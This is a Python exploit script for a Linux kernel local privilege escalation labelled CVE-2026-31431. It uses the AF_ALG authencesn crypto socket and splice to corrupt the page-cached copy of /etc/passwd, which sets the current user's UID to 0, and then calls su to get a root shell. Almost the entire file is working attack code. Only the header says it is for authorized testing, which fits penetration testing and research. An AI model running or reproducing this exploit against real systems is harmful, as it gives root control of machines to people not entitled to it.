#!/usr/bin/env python3
# CVE-2026-31431 ("Copy Fail") local privilege escalation.
#
# AUTHORIZED TESTING ONLY. Use only on hosts you own or are explicitly
# engaged to assess.
#
# Strategy
# --------
# The disclosed primitive is a 4-byte page-cache write into any readable
# file. We pick /etc/passwd (world-readable, consulted by every PAM/su
# login) and flip the running user's 4-digit UID field to "0000". After
# the patch lands, getpwnam() reads the corrupted page-cache copy and
# reports our UID as 0. We then invoke `su <user>`; PAM still validates
# our real password (against /etc/shadow, which is untouched), but the
# subsequent setuid() call drops us into a root shell.
#
# On-disk /etc/passwd is never modified - only the kernel's page-cache
# copy. To revert: `echo 3 | sudo tee /proc/sys/vm/drop_caches` (from the
# root shell you just obtained), or reboot.

import errno
import os
import pwd
import socket
import struct
import sys

AF_ALG                    = 38
SOL_ALG                   = 279
ALG_SET_KEY               = 1
ALG_SET_IV                = 2
ALG_SET_OP                = 3
ALG_SET_AEAD_ASSOCLEN     = 4
ALG_OP_DECRYPT            = 0
CRYPTO_AUTHENC_KEYA_PARAM = 1
ALG_NAME                  = "authencesn(hmac(sha256),cbc(aes))"

PASSWD = "/etc/passwd"


def authenc_keyblob(authkey: bytes, enckey: bytes) -> bytes:
    rtattr   = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
    keyparam = struct.pack(">I", len(enckey))
    return rtattr + keyparam + authkey + enckey


def write4(target_path: str, file_offset: int, four_bytes: bytes) -> None:
    """Overwrite 4 bytes of target_path's page cache at file_offset.

    The bytes are placed in AAD seqno_lo (bytes 4..7); authencesn's
    scratch-write copies them into the spliced page-cache page at the
    file offset we splice from.
    """
    if len(four_bytes) != 4:
        raise ValueError("write4 takes exactly 4 bytes")

    fd_target = os.open(target_path, os.O_RDONLY)
    try:
        # Make sure the page is cached.
        os.read(fd_target, 4096)

        master = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        master.bind(("aead", ALG_NAME))
        master.setsockopt(SOL_ALG, ALG_SET_KEY,
                          authenc_keyblob(b"\x00" * 32, b"\x00" * 16))
        op, _ = master.accept()
        try:
            aad = b"\x00" * 4 + four_bytes  # SPI || seqno_lo
            cmsg = [
                (SOL_ALG, ALG_SET_OP,            struct.pack("I", ALG_OP_DECRYPT)),
                (SOL_ALG, ALG_SET_IV,            struct.pack("I", 16) + b"\x00" * 16),
                (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("I", 8)),
            ]
            op.sendmsg([aad], cmsg, socket.MSG_MORE)

            pr, pw = os.pipe()
            try:
                n = os.splice(fd_target, pw, 32, offset_src=file_offset)
                if n != 32:
                    raise RuntimeError(f"splice file->pipe short: {n}")
                n = os.splice(pr, op.fileno(), n)
                if n != 32:
                    raise RuntimeError(f"splice pipe->op short: {n}")
            finally:
                os.close(pr)
                os.close(pw)

            try:
                op.recv(64)
            except OSError as e:
                if e.errno not in (errno.EBADMSG, errno.EINVAL):
                    raise
        finally:
            op.close()
            master.close()
    finally:
        os.close(fd_target)


def find_uid_field(path: str, username: str) -> tuple[int, str]:
    """Return (file_offset_of_uid_chars, current_uid_string) for username's
    /etc/passwd line."""
    with open(path, "rb") as f:
        data = f.read()

    needle = username.encode() + b":"
    line_start = 0
    while line_start < len(data):
        if data.startswith(needle, line_start):
            # rootsecdev:x:1000:1000:...
            #             ^         ^
            # find first ':' after needle (end of password field)
            j = line_start + len(needle)
            colon1   = data.index(b":", j)
            uid_off  = colon1 + 1
            uid_end  = data.index(b":", uid_off)
            return uid_off, data[uid_off:uid_end].decode("ascii")
        nl = data.find(b"\n", line_start)
        if nl < 0:
            break
        line_start = nl + 1
    raise LookupError(f"user {username!r} not found in {path}")


def main(argv: list[str]) -> int:
    user    = os.environ.get("USER") or pwd.getpwuid(os.getuid()).pw_name
    do_exec = "--shell" in argv

    print(f"[*] CVE-2026-31431 LPE  user={user}  uid={os.getuid()}")

    try:
        uid_off, uid_str = find_uid_field(PASSWD, user)
    except LookupError as e:
        print(f"[!] {e}")
        return 1
    print(f"[*] {PASSWD}: {user} UID field at offset {uid_off} = {uid_str!r}")

    if len(uid_str) != 4:
        print(f"[!] UID '{uid_str}' is {len(uid_str)} chars; this technique "
              f"needs a 4-digit UID (e.g. 1000-9999).")
        print(f"[!] Pick a different user or extend with multi-shot writes.")
        return 1

    print(f"[*] Patching {uid_str!r} -> '0000' in page cache...")
    write4(PASSWD, uid_off, b"0000")

    # Verify via fresh read (hits the page cache, not disk).
    with open(PASSWD, "rb") as f:
        f.seek(uid_off)
        landed = f.read(4)
    print(f"[*] Page cache now reads {landed!r} at offset {uid_off}")
    if landed != b"0000":
        print("[!] Patch did not land. Aborting.")
        return 1

    # Confirm libc agrees.
    try:
        pwent = pwd.getpwnam(user)
        print(f"[*] getpwnam({user!r}).pw_uid = {pwent.pw_uid}")
        if pwent.pw_uid != 0:
            print("[!] getpwnam still sees the real UID (NSS cache?). "
                  "Try clearing nscd/sssd cache, or run as a user that's "
                  "not cached.")
    except KeyError:
        pass

    print()
    print(f"[+] /etc/passwd page cache now lists {user} as UID 0.")
    print(f"[+] Run:   su {user}")
    print(f"[+] Enter your own password. su will setuid(0) and drop a root shell.")
    print()
    print(f"[i] Cleanup after testing (from the root shell):")
    print(f"[i]   echo 3 > /proc/sys/vm/drop_caches")

    if do_exec:
        print(f"[+] Executing `su {user}` now...")
        os.execvp("su", ["su", user])

    # If we are not exec'ing su (dry run), evict the corrupted page so the
    # rest of the system stops seeing a broken UID->name mapping. Any user
    # can request POSIX_FADV_DONTNEED on a file they can read.
    if not do_exec:
        fd = os.open(PASSWD, os.O_RDONLY)
        try:
            os.posix_fadvise(fd, 0, 0, os.POSIX_FADV_DONTNEED)
        finally:
            os.close(fd)
        print(f"[i] /etc/passwd page cache evicted (POSIX_FADV_DONTNEED). "
              f"UID->name lookups restored.")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
